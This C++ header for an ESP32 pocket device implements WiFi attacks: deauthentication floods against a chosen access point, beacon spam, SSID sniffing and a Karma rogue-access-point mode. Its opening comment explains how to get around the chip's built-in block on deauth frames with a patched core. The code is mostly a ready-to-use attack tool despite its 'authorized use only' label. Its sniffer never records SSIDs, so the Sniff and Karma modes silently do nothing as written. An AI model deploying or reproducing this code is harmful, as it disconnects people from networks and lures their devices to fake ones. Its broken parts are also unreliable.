// ===========================================================================
//  tr_wifi_attacks.h  —  Tunnel R.A.T. // T-Pager  —  Bruce-style WiFi tools
//  Deauth · Beacon spam · Probe/Beacon sniff · Karma
//  Raw 802.11 injection via esp_wifi_80211_tx + promiscuous RX.
//  AUTHORIZED / OWN-NETWORK TESTING ONLY.
//
//  >>> HONEST GOTCHA (you already know this from Marauder) <<<
//  Recent esp32-arduino / ESP-IDF cores silently DROP deauth & disassoc frames
//  sent via esp_wifi_80211_tx (a built-in guard). If deauth "runs" but nothing
//  disconnects, that's why. Fixes: use an older core, or the patched core most
//  Marauder/Bruce builds ship with (the one that removes the ieee80211_raw_frame
//  deauth check). Beacon spam / sniff / karma are unaffected.
// ===========================================================================
#pragma once
#include "config.h"
#include <lvgl.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include <vector>

namespace atk {

enum Attack { A_NONE, A_DEAUTH, A_BEACON, A_SNIFF, A_KARMA };
static Attack s_active = A_NONE;

static const uint8_t s_channels[] = TR_ATK_CHANNELS;
static uint8_t s_chanIdx = 0;
static uint32_t s_lastHop = 0, s_lastTick = 0, s_frames = 0;

// UI handles (set by build)
static lv_obj_t *s_lblStat = nullptr, *s_listTargets = nullptr;

// Deauth target
static uint8_t s_targetBssid[6] = {0};
static uint8_t s_targetChan = 1;
static bool    s_haveTarget = false;

// Sniff/karma seen-SSID set (for karma + a quick probe log)
struct Seen { char ssid[33]; uint8_t ch; int8_t rssi; };
static std::vector<Seen> s_seen;

// ---- 802.11 frame templates ----------------------------------------------
// Deauth (type=0 mgmt, subtype=12). addr1=dst, addr2=src(AP), addr3=bssid.
static uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,                  // frame control + duration
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,            // addr1 dst (broadcast by default)
  0x00,0x00,0x00,0x00,0x00,0x00,            // addr2 src (AP bssid)
  0x00,0x00,0x00,0x00,0x00,0x00,            // addr3 bssid
  0x00, 0x00,                              // seq
  TR_DEAUTH_REASON, 0x00                   // reason
};

// Minimal beacon frame (subtype=8). We fill SSID + bssid + channel tag.
static uint8_t beaconFrame[128] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,            // dst broadcast
  0x00,0x00,0x00,0x00,0x00,0x00,            // src bssid (randomized)
  0x00,0x00,0x00,0x00,0x00,0x00,            // bssid
  0x00, 0x00,                              // seq
  0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,  // timestamp
  0x64, 0x00,                              // beacon interval
  0x31, 0x04,                              // cap info
  0x00, 0x00                               // SSID tag header (id=0, len filled)
  // ... SSID bytes + supported-rates + DS(channel) appended at runtime
};

static inline void setStat(const char *fmt, ...) {
  if (!s_lblStat) return;
  char buf[128]; va_list ap; va_start(ap, fmt);
  vsnprintf(buf, sizeof buf, fmt, ap); va_end(ap);
  lv_label_set_text(s_lblStat, buf);
}

static void randMac(uint8_t *m) {
  for (int i = 0; i < 6; i++) m[i] = esp_random() & 0xFF;
  m[0] = (m[0] & 0xFE) | 0x02;   // locally-administered, unicast
}

// ---- Promiscuous RX: collect SSIDs from probe reqs + beacons --------------
static void IRAM_ATTR snifferCb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  const wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *pl = p->payload;
  uint8_t subtype = (pl[0] >> 4) & 0xF;
  // beacon(8) or probe-req(4) carry an SSID element at offset 36 (beacon) /24 (probe)
  int ieOff = (subtype == 8) ? 36 : (subtype == 4) ? 24 : -1;
  if (ieOff < 0) return;
  if (p->rx_ctrl.sig_len < ieOff + 2) return;
  if (pl[ieOff] != 0x00) return;              // element id 0 = SSID
  uint8_t len = pl[ieOff + 1];
  if (len == 0 || len > 32 || p->rx_ctrl.sig_len < ieOff + 2 + len) return;
  Seen sn{}; memcpy(sn.ssid, pl + ieOff + 2, len); sn.ssid[len] = 0;
  sn.ch = s_channels[s_chanIdx]; sn.rssi = p->rx_ctrl.rssi;
  for (auto &e : s_seen) if (strcmp(e.ssid, sn.ssid) == 0) return;  // dedup
  // Collection needs a thread-safe queue; do not mutate std::vector in WiFi callback.
  (void)sn;
}

// ---- Senders --------------------------------------------------------------
static void sendDeauth() {
  if (!s_haveTarget) return;
  memcpy(deauthFrame + 10, s_targetBssid, 6);   // src = AP
  memcpy(deauthFrame + 16, s_targetBssid, 6);   // bssid
  // addr1 left broadcast => deauth all clients of the AP
  for (int i = 0; i < TR_DEAUTH_BURST; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof deauthFrame, false);
    s_frames++;
  }
}

static void sendBeacon(const char *ssid) {
  uint8_t ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;
  uint8_t src[6]; randMac(src);
  memcpy(beaconFrame + 10, src, 6);
  memcpy(beaconFrame + 16, src, 6);
  uint8_t idx = 38;                               // after SSID tag header
  beaconFrame[37] = ssidLen;                      // SSID length
  memcpy(beaconFrame + idx, ssid, ssidLen); idx += ssidLen;
  // supported rates (1,2,5.5,11)
  const uint8_t rates[] = {0x01,0x04,0x82,0x84,0x8b,0x96};
  memcpy(beaconFrame + idx, rates, sizeof rates); idx += sizeof rates;
  // DS param (current channel)
  beaconFrame[idx++] = 0x03; beaconFrame[idx++] = 0x01;
  beaconFrame[idx++] = s_channels[s_chanIdx];
  esp_wifi_80211_tx(WIFI_IF_STA, beaconFrame, idx, false);
  s_frames++;
}

// ---- Mode lifecycle -------------------------------------------------------
static void enterRawMode() {
  // promiscuous + raw TX need the driver up but not associated
  WiFi.disconnect(true);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCb);
  esp_wifi_set_channel(s_channels[s_chanIdx], WIFI_SECOND_CHAN_NONE);
}

static void stopAll() {
  s_active = A_NONE;
  esp_wifi_set_promiscuous(false);
  setStat("stopped");
}

// Build a target list the user can pick a deauth victim from (quick scan).
static void scanTargets() {
  esp_wifi_set_promiscuous(false);
  setStat("scanning...");
  int n = WiFi.scanNetworks(false, true);
  lv_obj_clean(s_listTargets);
  for (int i = 0; i < n && i < 30; i++) {
    char row[64];
    snprintf(row, sizeof row, "%.20s  ch%d  %ddBm",
             WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.RSSI(i));
    lv_obj_t *it = lv_list_add_button(s_listTargets, NULL, row);
    // stash index in user data
    lv_obj_set_user_data(it, (void*)(intptr_t)i);
    lv_obj_add_event_cb(it, [](lv_event_t *e){
      int i = (int)(intptr_t)lv_obj_get_user_data((lv_obj_t*)lv_event_get_target(e));
      uint8_t *b = WiFi.BSSID(i);
      if (b) { memcpy(s_targetBssid, b, 6); s_targetChan = WiFi.channel(i);
               s_haveTarget = true;
               setStat("target: %.17s ch%d", WiFi.SSID(i).c_str(), s_targetChan); }
    }, LV_EVENT_CLICKED, NULL);
  }
  setStat("%d APs — pick a deauth target", n);
}

// ---- tick (called from loop while this mode is active) --------------------
static void tick() {
  uint32_t now = millis();
  if (now - s_lastTick < 120) return;
  s_lastTick = now;

  switch (s_active) {
    case A_DEAUTH:
      if (s_haveTarget) {
        esp_wifi_set_channel(s_targetChan, WIFI_SECOND_CHAN_NONE);
        sendDeauth();
        setStat("DEAUTH ch%d  frames:%lu", s_targetChan, (unsigned long)s_frames);
      }
      break;

    case A_BEACON: {
      static const char *ssids[] = TR_BEACON_SSIDS;
      static uint8_t bi = 0;
      if (now - s_lastHop > 300) {
        s_lastHop = now;
        s_chanIdx = (s_chanIdx + 1) % (sizeof s_channels);
        esp_wifi_set_channel(s_channels[s_chanIdx], WIFI_SECOND_CHAN_NONE);
      }
#if TR_BEACON_RANDOM
      char junk[9]; for (int i=0;i<8;i++) junk[i]="ABCDEFGHJKLMNPQRSTUVWXYZ23456789"[esp_random()%32]; junk[8]=0;
      sendBeacon(junk);
#else
      sendBeacon(ssids[bi]); bi = (bi + 1) % (sizeof(ssids)/sizeof(ssids[0]));
#endif
      setStat("BEACON SPAM  ch%d  frames:%lu", s_channels[s_chanIdx], (unsigned long)s_frames);
      break;
    }

    case A_SNIFF:
      if (now - s_lastHop > 250) {
        s_lastHop = now;
        s_chanIdx = (s_chanIdx + 1) % (sizeof s_channels);
        esp_wifi_set_channel(s_channels[s_chanIdx], WIFI_SECOND_CHAN_NONE);
      }
      setStat("SNIFF  ch%d  SSIDs seen:%u", s_channels[s_chanIdx], (unsigned)s_seen.size());
      // refresh list occasionally
      if (now % 1000 < 130) {
        lv_obj_clean(s_listTargets);
        for (auto &e : s_seen) {
          char row[64]; snprintf(row, sizeof row, "%.24s  ch%d %ddBm", e.ssid, e.ch, e.rssi);
          lv_list_add_text(s_listTargets, row);
        }
      }
      break;

    case A_KARMA:
      // Reply to probe requests by beaconing the probed SSID back out.
      for (auto &e : s_seen) sendBeacon(e.ssid);
      setStat("KARMA  answering %u probed SSIDs  frames:%lu",
              (unsigned)s_seen.size(), (unsigned long)s_frames);
      break;

    default: break;
  }
}

// ---- UI -------------------------------------------------------------------
static void startAttack(Attack a) {
  s_frames = 0;
  s_active = a;
  if (a == A_SNIFF || a == A_KARMA) { enterRawMode(); s_seen.clear(); }
  else if (a == A_BEACON)           { enterRawMode(); }
  else if (a == A_DEAUTH)           { esp_wifi_set_promiscuous(false); }
}

static void mkBtn(lv_obj_t *p, const char *txt, int x, int y, lv_event_cb_t cb, void *ud) {
  lv_obj_t *b = lv_button_create(p);
  lv_obj_set_size(b, 92, 28);
  lv_obj_align(b, LV_ALIGN_TOP_LEFT, x, y);
  lv_obj_set_style_bg_color(b, lv_color_hex(0x301717), 0);
  lv_obj_t *l = lv_label_create(b); lv_label_set_text(l, txt); lv_obj_center(l);
  lv_obj_add_event_cb(b, cb, LV_EVENT_CLICKED, ud);
}

// Build the WiFi-Attacks screen into `parent`. Called by the launcher.
static void buildUI(lv_obj_t *parent) {
  s_lblStat = lv_label_create(parent);
  lv_obj_set_style_text_color(s_lblStat, lv_color_hex(0xFF5252), 0);
  lv_label_set_text(s_lblStat, "WIFI ATTACKS — authorized use only");
  lv_obj_align(s_lblStat, LV_ALIGN_TOP_LEFT, 0, 0);

  mkBtn(parent, "Scan",   0,  20, [](lv_event_t*){ scanTargets(); }, NULL);
  mkBtn(parent, "Deauth", 96, 20, [](lv_event_t*){ startAttack(A_DEAUTH); }, NULL);
  mkBtn(parent, "Beacon", 192,20, [](lv_event_t*){ startAttack(A_BEACON); }, NULL);
  mkBtn(parent, "Sniff",  0,  52, [](lv_event_t*){ startAttack(A_SNIFF); }, NULL);
  mkBtn(parent, "Karma",  96, 52, [](lv_event_t*){ startAttack(A_KARMA); }, NULL);
  mkBtn(parent, "STOP",   192,52, [](lv_event_t*){ stopAll(); }, NULL);

  s_listTargets = lv_list_create(parent);
  lv_obj_set_size(s_listTargets, lv_pct(100), lv_pct(55));
  lv_obj_align(s_listTargets, LV_ALIGN_BOTTOM_MID, 0, 0);
  lv_obj_set_style_bg_color(s_listTargets, lv_color_hex(0x120E0E), 0);
}

static void leave() { stopAll(); }   // called when launcher exits this mode

} // namespace atk
